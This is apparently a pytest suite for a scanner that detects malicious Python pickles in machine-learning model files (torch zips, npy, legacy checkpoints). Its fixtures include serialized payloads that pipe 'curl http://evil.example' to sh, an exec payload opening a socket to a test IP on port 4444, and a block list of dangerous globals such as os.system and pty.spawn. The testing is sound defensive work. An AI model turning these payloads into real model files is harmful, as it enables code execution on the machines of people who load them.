"""Tests for cyberjection.hubguard.picklescan.

Every malicious fixture is either raw opcode bytes or `pickle.dumps`
output (serialization never executes `__reduce__`'s callable). Nothing in
this file unpickles anything; a sentinel test at the bottom proves the
scanner doesn't either.
"""

from __future__ import annotations

import base64
import io
import os
import pickle
import pickletools
import zipfile
from collections import OrderedDict
from pathlib import Path

import pytest

from cyberjection.hubguard.models import Severity
from cyberjection.hubguard.picklescan import (
    PickleScanResult,
    classify_global,
    scan_pickle_bytes,
    scan_pickle_file,
)
from tests.unit.hubguard_helpers import (
    EMPTY_TUPLE,
    MARK,
    POP,
    PROTO2,
    PROTO4,
    REDUCE,
    STOP,
    TUPLE,
    benign_torch_data_pkl,
    binbytes,
    binget,
    binput,
    call_global,
    global_op,
    npy_object_array,
    short_unicode,
    stack_global_call,
    torch_zip,
)


def rules(result: PickleScanResult) -> set:
    return {f.rule_id for f in result.findings}


def worst(result: PickleScanResult) -> Severity:
    return max((f.severity for f in result.findings), key=lambda s: s.rank, default=Severity.INFO)


class _Evil:
    def __init__(self, fn, *args):  # type: ignore[no-untyped-def]
        self.fn, self.args = fn, args

    def __reduce__(self):  # type: ignore[no-untyped-def]
        return (self.fn, self.args)


class TestClassifyGlobal:
    @pytest.mark.parametrize(
        "module,name",
        [
            ("os", "system"),
            ("posix", "system"),
            ("nt", "system"),
            ("subprocess", "Popen"),
            ("builtins", "eval"),
            ("builtins", "exec"),
            ("__builtin__", "eval"),  # Python 2 alias, normalized by _compat_pickle
            ("builtins", "__import__"),
            ("runpy", "run_path"),
            ("socket", "create_connection"),
            ("torch.hub", "load"),
            ("torch", "load"),
            ("numpy.testing._private.utils", "runstring"),
            ("torch._utils", "os.system"),  # getattr-per-segment traversal
            ("collections", "os.system"),
            ("webbrowser", "open"),
            ("pty", "spawn"),
            ("marshal", "loads"),
        ],
    )
    def test_dangerous_globals_are_critical(self, module: str, name: str) -> None:
        severity, _ = classify_global(module, name)
        assert severity == Severity.CRITICAL, (module, name)

    @pytest.mark.parametrize(
        "module,name",
        [
            ("builtins", "getattr"),
            ("operator", "attrgetter"),
            ("operator", "methodcaller"),
            ("functools", "partial"),
            ("builtins", "type"),
            ("torch._utils", "_rebuild_tensor_v2.__globals__"),
        ],
    )
    def test_gadgets_are_high(self, module: str, name: str) -> None:
        severity, _ = classify_global(module, name)
        assert severity == Severity.HIGH, (module, name)

    @pytest.mark.parametrize(
        "module,name",
        [
            ("collections", "OrderedDict"),
            ("torch._utils", "_rebuild_tensor_v2"),
            ("torch", "FloatStorage"),
            ("torch", "BFloat16Storage"),
            ("numpy.core.multiarray", "_reconstruct"),
            ("numpy", "dtype"),
            ("builtins", "set"),
            ("__builtin__", "set"),
            ("copy_reg", "_reconstructor"),  # py2 name for copyreg
            ("_codecs", "encode"),
        ],
    )
    def test_allowlisted_globals_are_info(self, module: str, name: str) -> None:
        severity, _ = classify_global(module, name)
        assert severity == Severity.INFO, (module, name)

    def test_unknown_global_is_medium(self) -> None:
        assert classify_global("transformers.models.llama", "LlamaConfig")[0] == Severity.MEDIUM

    def test_malformed_global_is_critical(self) -> None:
        assert classify_global("os.", "system")[0] == Severity.CRITICAL
        assert classify_global("", "eval")[0] == Severity.CRITICAL


class TestMaliciousPickles:
    @pytest.mark.parametrize("protocol", [0, 1, 2, 3, 4, 5])
    def test_os_system_reduce_detected_at_every_protocol(self, protocol: int) -> None:
        payload = pickle.dumps(_Evil(os.system, "curl http://evil.example | sh"), protocol=protocol)
        result = scan_pickle_bytes(payload)
        assert worst(result) == Severity.CRITICAL
        assert {"pickle.dangerous_import", "pickle.dangerous_call"} <= rules(result)
        assert not result.safe
        assert result.dangerous_imports[0].name == "system"

    def test_exec_payload_is_decoded_and_analyzed(self) -> None:
        code = "import socket; socket.create_connection(('203.0.113.9', 4444))"
        result = scan_pickle_bytes(pickle.dumps(_Evil(exec, code), protocol=4))
        embedded = [f for f in result.findings if f.rule_id == "pickle.embedded_code"]
        assert embedded and embedded[0].severity == Severity.CRITICAL
        assert "socket.create_connection" in embedded[0].description

    def test_eval_via_python2_builtin_alias(self) -> None:
        result = scan_pickle_bytes(call_global("__builtin__", "eval", "__import__('os').system('id')"))
        assert any(i.module == "builtins" and i.name == "eval" for i in result.imports)
        assert worst(result) == Severity.CRITICAL

    def test_stack_global_with_memoized_operands_is_resolved(self) -> None:
        # Push "os" and "system", memoize both, pop them, then fetch them
        # back from the memo -- a scanner that only looks at the two
        # opcodes immediately preceding STACK_GLOBAL sees BINGETs, not strings.
        payload = (
            PROTO4
            + short_unicode("os") + binput(0) + POP
            + short_unicode("system") + binput(1) + POP
            + binget(0) + binget(1) + b"\x93"
            + MARK + short_unicode("id") + TUPLE + REDUCE + STOP
        )
        pickletools.dis(payload, out=io.StringIO())  # sanity: well-formed
        result = scan_pickle_bytes(payload)
        assert any(i.qualified in {"os.system"} for i in result.imports)
        assert worst(result) == Severity.CRITICAL

    def test_dotted_name_traversal_through_allowlisted_module(self) -> None:
        result = scan_pickle_bytes(stack_global_call("torch._utils", "os.system", "id"))
        assert worst(result) == Severity.CRITICAL
        assert any("traverses" in f.description or "inside dangerous" in f.description for f in result.findings)

    def test_unresolvable_stack_global_fails_closed(self) -> None:
        # Module name is the *result of a call*, unknowable statically.
        payload = (
            PROTO4
            + global_op("collections", "OrderedDict") + EMPTY_TUPLE + REDUCE
            + short_unicode("system")
            + b"\x93" + EMPTY_TUPLE + REDUCE + STOP
        )
        result = scan_pickle_bytes(payload)
        assert "pickle.unresolved_stack_global" in rules(result)
        assert worst(result) == Severity.CRITICAL

    def test_nested_pickle_in_bytes_constant_is_scanned(self) -> None:
        inner = call_global("subprocess", "check_output", "whoami")
        outer = PROTO4 + global_op("torch.storage", "_load_from_bytes") + MARK + binbytes(inner) + TUPLE + REDUCE + STOP
        result = scan_pickle_bytes(outer)
        assert any(i.module == "subprocess" for i in result.imports)
        assert any(i.qualified == "torch.storage._load_from_bytes" and i.severity == Severity.CRITICAL for i in result.imports)

    def test_base64_encoded_nested_pickle_is_scanned(self) -> None:
        inner = call_global("os", "system", "id")
        encoded = base64.b64encode(inner).decode()
        payload = PROTO4 + global_op("collections", "OrderedDict") + EMPTY_TUPLE + REDUCE + short_unicode(encoded) + POP + STOP
        result = scan_pickle_bytes(payload)
        assert "pickle.nested_encoded_pickle" in rules(result)
        assert any(i.qualified == "os.system" for i in result.imports)

    def test_base64_encoded_python_is_analyzed(self) -> None:
        code = "__import__('subprocess').run(['sh','-c','id'])"
        encoded = base64.b64encode(code.encode()).decode()
        result = scan_pickle_bytes(call_global("builtins", "exec", encoded))
        assert any(f.rule_id == "pickle.embedded_code" and "base64" in f.description.lower() for f in result.findings)

    def test_extension_registry_opcodes_flagged(self) -> None:
        payload = PROTO2 + b"\x82\x01" + EMPTY_TUPLE + REDUCE + STOP  # EXT1 1
        result = scan_pickle_bytes(payload)
        assert "pickle.extension_registry" in rules(result)

    def test_inst_opcode_import_detected(self) -> None:
        payload = b"(S'id'\nios\nsystem\n."  # protocol 0 INST
        result = scan_pickle_bytes(payload)
        assert any(i.qualified == "os.system" and i.opcode == "INST" for i in result.imports)

    def test_garbage_in_pickle_format_fails_closed(self) -> None:
        result = scan_pickle_bytes(b"\xff\xfe\x00not a pickle at all")
        assert "pickle.unparseable" in rules(result)
        assert worst(result) == Severity.HIGH

    def test_truncated_pickle_fails_closed(self) -> None:
        result = scan_pickle_bytes(call_global("collections", "OrderedDict")[:-1])
        assert "pickle.unparseable" in rules(result)

    def test_stack_underflow_reported_as_anomaly(self) -> None:
        payload = PROTO2 + REDUCE + STOP
        result = scan_pickle_bytes(payload)
        assert "pickle.stack_anomaly" in rules(result)


class TestBenignPickles:
    def test_plain_state_dict_is_clean(self) -> None:
        state = OrderedDict(weight=[0.1, 0.2], bias=[0.0], step=3, name="layer")
        result = scan_pickle_bytes(pickle.dumps(state, protocol=4))
        assert result.findings == []
        assert result.safe
        assert result.pickles_scanned == 1

    def test_torch_shaped_data_pkl_is_clean(self) -> None:
        data = benign_torch_data_pkl()
        pickletools.dis(data, out=io.StringIO())  # stack-consistent per pickletools itself
        result = scan_pickle_bytes(data)
        assert result.findings == []
        assert {i.qualified for i in result.imports} == {
            "collections.OrderedDict",
            "torch._utils._rebuild_tensor_v2",
            "torch.FloatStorage",
        }

    def test_tensor_names_are_not_mistaken_for_code(self) -> None:
        state = {f"model.layers.{i}.self_attn.q_proj.weight": i for i in range(50)}
        state["lm_head.weight"] = 0
        assert scan_pickle_bytes(pickle.dumps(state, protocol=4)).findings == []

    def test_unknown_class_is_medium_and_deduplicated(self) -> None:
        payload = PROTO2 + (global_op("mylib.models", "Net") + EMPTY_TUPLE + REDUCE + POP) * 5 + global_op("collections", "OrderedDict") + EMPTY_TUPLE + REDUCE + STOP
        result = scan_pickle_bytes(payload)
        unknown = [f for f in result.findings if f.rule_id == "pickle.unknown_import"]
        assert len(unknown) == 1 and unknown[0].severity == Severity.MEDIUM


class TestContainers:
    def test_benign_torch_zip(self) -> None:
        result = scan_pickle_bytes(torch_zip(benign_torch_data_pkl()))
        assert result.format == "torch-zip"
        assert result.findings == []

    def test_malicious_torch_zip(self) -> None:
        result = scan_pickle_bytes(torch_zip(call_global("os", "system", "id")), label="pytorch_model.bin")
        assert result.format == "torch-zip"
        assert worst(result) == Severity.CRITICAL
        assert all(f.file == "pytorch_model.bin" for f in result.findings)

    def test_malicious_secondary_pkl_member_in_zip(self) -> None:
        archive = torch_zip(benign_torch_data_pkl(), extra={"archive/extra.pkl": call_global("subprocess", "Popen", "sh")})
        result = scan_pickle_bytes(archive)
        assert any(i.module == "subprocess" for i in result.imports)

    def test_torchscript_code_flagged(self) -> None:
        archive = torch_zip(benign_torch_data_pkl(), extra={"archive/code/__torch__.py": b"def forward(self): pass"})
        assert "pickle.torchscript_code" in rules(scan_pickle_bytes(archive))

    def test_legacy_concatenated_torch_format(self) -> None:
        magic = pickle.dumps(0x1950A86A20F9469CFC6C, protocol=2)
        version = pickle.dumps(1001, protocol=2)
        sys_info = pickle.dumps({"little_endian": True}, protocol=2)
        payload = call_global("os", "system", "id")
        data = magic + version + sys_info + payload + b"\x00\x01raw storage bytes that are not a pickle"
        result = scan_pickle_bytes(data)
        assert result.format == "torch-legacy"
        assert result.pickles_scanned == 4
        assert worst(result) == Severity.CRITICAL

    def test_npy_object_array_pickle(self) -> None:
        result = scan_pickle_bytes(npy_object_array(call_global("os", "system", "id")))
        assert result.format == "npy"
        assert "pickle.npy_object_array" in rules(result)
        assert worst(result) == Severity.CRITICAL

    def test_npy_numeric_array_is_clean(self) -> None:
        header = "{'descr': '<f4', 'fortran_order': False, 'shape': (2,), }"
        header += " " * (63 - (10 + len(header)) % 64) + "\n"
        data = b"\x93NUMPY\x01\x00" + len(header).to_bytes(2, "little") + header.encode() + b"\x00" * 8
        assert scan_pickle_bytes(data).findings == []

    def test_npz_member_scanned(self) -> None:
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as archive:
            archive.writestr("arr_0.npy", npy_object_array(call_global("builtins", "exec", "print(1)")))
        result = scan_pickle_bytes(buffer.getvalue())
        assert worst(result) == Severity.CRITICAL

    def test_corrupt_zip_fails_closed(self) -> None:
        result = scan_pickle_bytes(b"PK\x03\x04" + b"\x00" * 40)
        assert "pickle.unparseable" in rules(result)

    def test_scan_file_on_disk(self, tmp_path: Path) -> None:
        path = tmp_path / "model.ckpt"
        path.write_bytes(torch_zip(call_global("os", "system", "id")))
        result = scan_pickle_file(path)
        assert result.path == "model.ckpt"
        assert not result.safe


def test_scanner_never_executes_the_payload(tmp_path: Path) -> None:
    marker = tmp_path / "pwned"
    # If any scanner path called pickle.load, this would create the marker.
    payload = pickle.dumps(_Evil(open, str(marker), "w"), protocol=4)
    payload_zip = torch_zip(payload)
    scan_pickle_bytes(payload)
    scan_pickle_bytes(payload_zip)
    scan_pickle_bytes(npy_object_array(payload))
    assert not marker.exists()


class TestTrailingBinaryData:
    def test_legacy_torch_float_storage_is_not_misread_as_opcodes(self) -> None:
        # Raw storage bytes full of 'c' (GLOBAL) and newlines would produce
        # garbage "imports" if parsed as a sixth pickle.
        magic = pickle.dumps(0x1950A86A20F9469CFC6C, protocol=2)
        parts = [magic, pickle.dumps(1001, protocol=2), pickle.dumps({"little_endian": True}, protocol=2)]
        parts.append(benign_torch_data_pkl())
        parts.append(pickle.dumps(["0"], protocol=2))
        storage = b"cos\nsystem\n(S'id'\ntR." * 4
        result = scan_pickle_bytes(b"".join(parts) + storage)
        assert result.format == "torch-legacy"
        assert result.pickles_scanned == 5
        assert result.findings == []

    def test_trailing_noise_after_raw_pickle_is_ignored(self) -> None:
        noise = b"c\x00\xff garbage\n\x01" * 10
        result = scan_pickle_bytes(pickle.dumps({"a": 1}, protocol=4) + noise)
        assert result.findings == [] and result.pickles_scanned == 1

    def test_complete_second_pickle_is_still_scanned(self) -> None:
        result = scan_pickle_bytes(pickle.dumps({"a": 1}, protocol=2) + call_global("os", "system", "id"))
        assert any(i.qualified == "os.system" for i in result.imports)


class TestCorruptArchives:
    def _corrupt_member_header(self) -> bytes:
        # A valid first member, then a pickle member whose local header is
        # corrupted; the central directory still lists it.
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as archive:
            archive.writestr("archive/version", b"3")
            archive.writestr("archive/data.pkl", call_global("os", "system", "id"))
        data = bytearray(buffer.getvalue())
        second = data.find(bytes([0x50, 0x4B, 0x03, 0x04]), 4)
        data[second + 2 : second + 4] = b"XX"
        return bytes(data)

    def test_corrupt_member_is_a_finding_not_a_crash(self) -> None:
        result = scan_pickle_bytes(self._corrupt_member_header())
        assert result.format in {"zip", "torch-zip"}
        assert any(f.rule_id == "pickle.unparseable" and "could not be read" in f.description for f in result.findings)

    def test_bad_crc_is_a_finding(self) -> None:
        data = bytearray(torch_zip(call_global("os", "system", "id")))
        idx = data.find(b"cos\nsystem")
        data[idx + 1] ^= 0xFF  # change stored bytes so the CRC no longer matches
        result = scan_pickle_bytes(bytes(data))
        assert any("could not be read" in f.description for f in result.findings)

    def test_cli_file_command_survives_corrupt_archive(self, tmp_path: Path) -> None:
        typer_testing = pytest.importorskip("typer.testing")
        from cyberjection.cli.main import EXIT_SUPPLY_CHAIN_BLOCKED, app

        path = tmp_path / "pytorch_model.bin"
        path.write_bytes(self._corrupt_member_header())
        result = typer_testing.CliRunner().invoke(app, ["hubguard", "file", str(path)])
        assert result.exit_code == EXIT_SUPPLY_CHAIN_BLOCKED, result.output
